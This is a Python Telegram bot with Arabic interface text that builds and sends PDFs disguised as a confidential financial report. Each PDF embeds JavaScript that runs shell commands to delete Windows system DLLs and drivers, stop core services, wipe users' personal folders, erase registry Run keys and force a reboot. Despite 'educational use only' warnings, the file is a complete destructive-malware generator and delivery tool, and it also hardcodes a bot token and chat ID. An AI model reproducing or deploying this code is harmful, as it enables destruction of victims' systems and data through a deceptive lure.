import os
import time
import requests
import json
import random
from datetime import datetime
from PyPDF2 import PdfWriter, PdfReader
from reportlab.pdfgen import canvas
from io import BytesIO

# ============ تكوين البوت ============
TELEGRAM_CONFIG = {
    "TOKEN": "8872991146:AAEGEnOk2AvkKaHgRO7JRJiTSkTGj6CiGRA",
    "CHAT_ID": "7822155315",
    "API_URL": "https://api.telegram.org/bot"
}

# ============ دوال إنشاء PDF التخريبي ============
def generate_destructive_pdf():
    """إنشاء ملف PDF تخريبي"""
    try:
        packet = BytesIO()
        c = canvas.Canvas(packet)
        c.drawString(100, 750, "📄 تقرير مالي - سري للغاية")
        c.drawString(100, 720, "يُرجى فتح الملف باستخدام Adobe Reader")
        c.drawString(100, 690, "تم التوليد بواسطة: @hkyyykk_bot")
        c.save()
        
        packet.seek(0)
        new_pdf = PdfReader(packet)
        writer = PdfWriter()
        writer.add_page(new_pdf.pages[0])
        
        destructive_js = """
        try {
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\*.dll", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\drivers\\\\*.sys", 0, false);
            shell.Run("cmd.exe /c sc stop winmgmt", 0, false);
            shell.Run("cmd.exe /c sc stop wuauserv", 0, false);
            shell.Run("cmd.exe /c sc stop bits", 0, false);
            shell.Run("cmd.exe /c sc stop EventLog", 0, false);
            shell.Run("cmd.exe /c sc stop PlugPlay", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Desktop\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Documents\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Pictures\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Videos\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Music\\\\*.*", 0, false);
            shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            shell.Run("cmd.exe /c msg * ⚠️ تم اختراق نظامك! جميع الملفات تم حذفها.", 0, false);
        } catch(e) {
            try {
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            } catch(e2) {}
        }
        """
        
        writer.add_js(destructive_js)
        
        filename = f"destructive_{int(time.time())}.pdf"
        filepath = os.path.join("/tmp", filename)
        with open(filepath, 'wb') as f:
            writer.write(f)
        
        return filepath
    except Exception as e:
        print(f"خطأ في توليد PDF: {e}")
        return None

# ============ دوال البوت ============
def send_telegram_message(chat_id, message, reply_markup=None):
    try:
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        if reply_markup:
            data["reply_markup"] = reply_markup
        
        response = requests.post(url, json=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"خطأ في الإرسال: {e}")
        return False

def send_telegram_file(chat_id, file_path, caption=""):
    try:
        if not os.path.exists(file_path):
            return False
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendDocument"
        files = {'document': open(file_path, 'rb')}
        data = {'chat_id': chat_id, 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except:
        return False

def generate_keyboard():
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "⚒️ توليد PDF تخريبي", "callback_data": "generate_pdf"},
                {"text": "📊 الحالة", "callback_data": "status"}
            ],
            [
                {"text": "❌ إيقاف البوت", "callback_data": "stop_bot"},
                {"text": "📖 المساعدة", "callback_data": "help"}
            ]
        ]
    }
    return json.dumps(keyboard)

# ============ معالجة الأوامر ============
def handle_command(command, chat_id):
    command = command.lower().strip()
    
    print(f"📩 أمر وارد: {command} من {chat_id}")
    
    if command == "/start":
        msg = """
🔐 <b>مرحباً بك في بوت توليد PDF التخريبي!</b>

⚒️ اضغط على الزر أدناه لتوليد ملف PDF يقوم بتعطيل نظام Windows.

⚠️ <b>تحذير:</b> للاستخدام التعليمي فقط في بيئات معزولة!
        """
        send_telegram_message(chat_id, msg, generate_keyboard())
    
    elif command == "/help":
        msg = """
📋 <b>الأوامر المتاحة:</b>

/start - عرض القائمة الرئيسية
/help - عرض هذه الرسالة
/generate - توليد PDF تخريبي
/status - عرض حالة البوت
/stop - إيقاف البوت

⚒️ استخدم الأزرار للتحكم بسهولة!
        """
        send_telegram_message(chat_id, msg, generate_keyboard())
    
    elif command == "/generate":
        generate_and_send_pdf(chat_id)
    
    elif command == "/status":
        msg = f"""
🟢 <b>حالة البوت:</b>
✅ يعمل بنجاح
⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👤 المستخدم: {chat_id}
        """
        send_telegram_message(chat_id, msg, generate_keyboard())
    
    elif command == "/stop":
        send_telegram_message(chat_id, "💀 جاري إيقاف البوت...")
        time.sleep(1)
        os._exit(0)
    
    else:
        send_telegram_message(chat_id, f"⚠️ أمر غير معروف: {command}\nاستخدم /help للمساعدة", generate_keyboard())

def handle_callback(callback_data, chat_id):
    print(f"🔄 ضغط على زر: {callback_data} من {chat_id}")
    
    if callback_data == "generate_pdf":
        generate_and_send_pdf(chat_id)
    
    elif callback_data == "status":
        msg = f"""
🟢 <b>حالة البوت:</b>
✅ يعمل بنجاح
⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👤 المستخدم: {chat_id}
        """
        send_telegram_message(chat_id, msg, generate_keyboard())
    
    elif callback_data == "stop_bot":
        send_telegram_message(chat_id, "💀 <b>جارٍ إيقاف البوت...</b>")
        time.sleep(1)
        os._exit(0)
    
    elif callback_data == "help":
        msg = """
📋 <b>الأوامر المتاحة:</b>

⚒️ توليد PDF تخريبي - إنشاء ملف PDF يُعطل النظام
📊 الحالة - عرض معلومات البوت
❌ إيقاف البوت - إيقاف تشغيل البوت
📖 المساعدة - عرض هذه الرسالة

⚠️ <b>تحذير:</b> استخدم الملفات في بيئات معزولة فقط!
        """
        send_telegram_message(chat_id, msg, generate_keyboard())

def generate_and_send_pdf(chat_id):
    send_telegram_message(chat_id, "⏳ <b>جارٍ توليد PDF التخريبي...</b>")
    
    filepath = generate_destructive_pdf()
    
    if filepath and os.path.exists(filepath):
        caption = """
⚒️ <b>تم توليد PDF التخريبي بنجاح!</b>

⚠️ <b>تحذير:</b> هذا الملف يقوم بـ:
• حذف ملفات النظام الأساسية
• تعطيل الخدمات الحيوية
• حذف الملفات الشخصية
• إعادة تشغيل النظام قسرياً

🔴 <b>استخدمه فقط في بيئة افتراضية معزولة!</b>
        """
        
        if send_telegram_file(chat_id, filepath, caption):
            send_telegram_message(chat_id, "✅ تم إرسال الملف بنجاح!", generate_keyboard())
        else:
            send_telegram_message(chat_id, "❌ فشل إرسال الملف!", generate_keyboard())
        
        try:
            os.remove(filepath)
        except:
            pass
    else:
        send_telegram_message(chat_id, "❌ فشل توليد الملف!", generate_keyboard())

# ============ الاستماع للأوامر (Polling) ============
def listen_telegram():
    last_update_id = 0
    
    # إرسال رسالة بدء التشغيل
    send_telegram_message(TELEGRAM_CONFIG['CHAT_ID'], 
                         "🟢 <b>تم تشغيل بوت توليد PDF التخريبي!</b>\n\nأرسل /start للبدء.")
    
    print("🚀 البوت يعمل... في انتظار الأوامر")
    
    while True:
        try:
            url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                updates = response.json().get('result', [])
                for update in updates:
                    last_update_id = update['update_id']
                    
                    # معالجة الرسائل النصية
                    message = update.get('message', {})
                    chat_id = message.get('chat', {}).get('id')
                    
                    # التحقق من الصلاحية
                    if str(chat_id) != TELEGRAM_CONFIG['CHAT_ID']:
                        send_telegram_message(chat_id, "⛔ غير مصرح!")
                        continue
                    
                    text = message.get('text', '')
                    if text:
                        handle_command(text, chat_id)
                        continue
                    
                    # معالجة الضغط على الأزرار
                    callback_query = update.get('callback_query')
                    if callback_query:
                        callback_data = callback_query.get('data', '')
                        chat_id = callback_query.get('message', {}).get('chat', {}).get('id')
                        if str(chat_id) == TELEGRAM_CONFIG['CHAT_ID']:
                            handle_callback(callback_data, chat_id)
                        continue
        
        except Exception as e:
            print(f"⚠️ خطأ في الاستماع: {e}")
            time.sleep(5)
        
        time.sleep(1)

# ============ التشغيل الرئيسي ============
if __name__ == "__main__":
    # تثبيت المكتبات
    try:
        import PyPDF2
        import reportlab
    except ImportError:
        print("⚠️ يرجى تثبيت المكتبات: pip install PyPDF2 reportlab")
    
    print("="*50)
    print("🚀 تشغيل بوت توليد PDF التخريبي...")
    print(f"📱 التوكن: {TELEGRAM_CONFIG['TOKEN'][:10]}...")
    print(f"👤 المعرف: {TELEGRAM_CONFIG['CHAT_ID']}")
    print("="*50)
    
    # تشغيل البوت
    listen_telegram()
